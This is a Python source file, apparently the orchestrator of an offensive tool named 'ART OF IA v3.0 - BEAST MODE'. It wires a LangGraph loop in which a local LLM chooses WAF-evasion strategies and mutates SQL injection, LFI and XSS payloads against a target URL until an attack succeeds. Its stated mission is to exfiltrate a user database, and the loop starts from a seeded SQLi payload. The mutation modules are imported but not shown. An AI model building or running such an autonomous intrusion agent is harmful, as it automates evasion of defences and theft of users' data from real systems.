import os
import asyncio
from typing import TypedDict, List, Dict, Any
from langgraph.graph import StateGraph, END

# Importamos tus módulos especializados
from dual_llm_pattern import LocalDualLLM
from mutators import arsenal  # Importamos el ArsenalManager (Sprint 1)
from planner import Planner     # Asumiendo que tienes la clase Planner en planner.py
from quarantine import Quarantine # Asumiendo que tienes la clase Quarantine en quarantine.py
from sniper import Sniper       # Asumiendo que tienes la clase Sniper en sniper.py
from reflector import Reflector   # El Reflector Heurístico que acabamos de crear

# --- ESQUEMA DE ESTADO "BEAST MODE" ---
class AgentState(TypedDict):
    mission: str
    target_url: str
    current_payload: str
    vuln_type: str  # NUEVO: 'SQLI', 'LFI', 'XSS'
    exfiltrated_data: str
    iteration: int
    status: str
    failed_attempts_summary: List[Dict[str, Any]] 
    last_response_metadata: Dict[str, Any] # Para el Reflector Heurístico
    waf_metadata: Dict[str, Any] 

class ArtOfIAOrchestrator:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.max_iterations = 20
        
        # Instanciamos los nodos modulares
        # Pasamos la URL al reflector para que sepa dónde disparar
        self.planner = Planner() 
        self.quarantine = Quarantine() 
        self.sniper = Sniper() 
        self.reflector = Reflector(target_url=target_url)
        
        # El cerebro central para coordinar estrategias
        self.brain = LocalDualLLM(model="ollama/qwen3.5:9b")

    async def planner_node(self, state: AgentState):
        """Coordinador de estrategia y Context Folding."""
        print(f"\n[*] [PLANNER] Iteración {state.get('iteration', 0)}. Analizando misión...")
        
        # Llamamos a la lógica del archivo planner.py
        result = await self.planner.execute(state)
        
        # Forzamos el incremento de iteración y mantenemos el estado
        return {
            **result, 
            "iteration": state.get("iteration", 0) + 1
        }

    async def quarantine_node(self, state: AgentState):
        """Sanitizador de logs y detector de reglas WAF."""
        print("[*] [QUARANTINE] Analizando respuesta del WAF...")
        # Llamamos a la lógica de quarantine.py
        result = await self.quarantine.execute(state)
        return result

    async def sniper_node(self, state: AgentState):
        """El Ejecutor: Elige la bala y muta el payload."""
        print(f"[*] [SNIPER] Generando payload para {state.get('vuln_type', 'SQLI')}...")
        
        # 1. Obtener la estrategia del cerebro (Dual-LLM)
        # El cerebro decide si usar 'HEX_ENCODE', 'SQUEEZE', 'DOT_SQUASH', etc.
        strategy = await self.brain.decide_strategy(state) 
        
        # 2. Usar el ARSENAL Multi-Vector (Sprint 1)
        # Aquí es donde ocurre la magia: muta según la vulnerabilidad detectada
        mutated_payload = arsenal.mutate(
            payload=state["current_payload"], 
            vuln_type=state.get("vuln_type", "SQLI"), 
            strategy=strategy
        )
        
        print(f"[+] [SNIPER] Nueva mutación aplicada: {strategy}")
        return {"current_payload": mutated_payload}

    async def reflector_node(self, state: AgentState):
        """El Juez Heurístico: Determina si el ataque funcionó."""
        # Llamamos al archivo reflector.py (Heurística de tiempo/longitud/diff)
        result = await self.reflector.execute(state)
        return result

    def build_graph(self):
        """Construcción del Grafo de Estado de LangGraph."""
        workflow = StateGraph(AgentState)
        
        # Añadimos los nodos
        workflow.add_node("planner", self.planner_node)
        workflow.add_node("quarantine", self.quarantine_node)
        workflow.add_node("sniper", self.sniper_node)
        workflow.add_node("reflector", self.reflector_node)

        # Flujo de ejecución
        workflow.set_entry_point("planner")
        workflow.add_edge("planner", "reflector")
        
        # Ruteo Condicional basado en el status del Reflector
        workflow.add_conditional_edges(
            "reflector",
            lambda x: "quarantine" if x["status"] in ["blocked", "failed"] else END,
            {
                "quarantine": "quarantine", 
                END: END
            }
        )
        
        workflow.add_edge("quarantine", "sniper")
        workflow.add_edge("sniper", "reflector")

        return workflow.compile()

async def main():
    # Configuración inicial
    target = "http://target-waf.com/api" # Cambia por tu target
    orchestrator = ArtOfIAOrchestrator(target_url=target)
    app = orchestrator.build_graph()
    
    print("=========================================================")
    print(" ART OF IA v3.0 - BEAST MODE: MULTI-VECTOR + HEURISTICS ")
    print("=========================================================")
    
    # Estado inicial optimizado
    initial_state = {
        "mission": "Exfiltrar base de datos de usuarios",
        "target_url": target,
        "current_payload": "1' AND (SELECT 1)=1--", # Payload inicial
        "vuln_type": "SQLI", # El agente puede cambiar esto a LFI o XSS
        "exfiltrated_data": "",
        "iteration": 0,
        "status": "starting",
        "failed_attempts_summary": [],
        "last_response_metadata": {},
        "waf_metadata": {}
    }
    
    async for output in app.astream(initial_state):
        # El estado se actualiza automáticamente en cada nodo
        pass

if __name__ == "__main__":
    asyncio.run(main())
